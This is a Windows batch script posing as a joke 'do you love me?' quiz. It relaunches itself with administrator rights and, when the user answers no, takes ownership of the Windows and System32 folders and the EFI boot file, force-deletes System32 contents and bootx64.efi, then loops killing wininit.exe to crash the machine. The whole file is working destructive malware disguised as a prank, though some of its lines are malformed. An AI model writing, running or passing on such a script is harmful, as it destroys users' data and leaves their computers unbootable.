@echo off
echo Running "C:\Users\WDAGUtilityAccount\Desktop\ILOVEYOU.bat" as Administrator...
powershell "Start-Process "C:\Users\WDAGUtilityAccount\Desktop\ILOVEYOU.bat" -ArgumentList '%filePath%' -Verb RunAs"

@echo off

color a 
echo Hello this is a updated and edited version of do you love me :) do you love me? (answer in only yes/no)
set /p input=
if /i %input%==yes goto love
if /i %input%==no goto hate
if /i not %input%== yes,no goto 1

:love
echo I Love You Too...
echo See you later 
pause
exit
:hate
echo But.... I LOVE YOU....lol
echo you just got HACKED LOLOLOLOL
pause
Takeown /f [C:/Windows] /r /d 
Takeown /f [C:\Windows\System32] /r /d
Takeown /f [C:\EFI\Boot\bootx64.efi] /r /d
echo Say hello to the blue screen of death for me your boot is about to be deleted too!!... Oh and one last thing I LOVE YOU!!!!!!!!!
Del /F /Q "C:\Windows\System32"
Del /F /Q "C:\EFI\Boot\bootx64.efi"
@echo off
Taskkill /f /im wininit.exe
:A
start Taskkill /f /im wininit.exe
goto A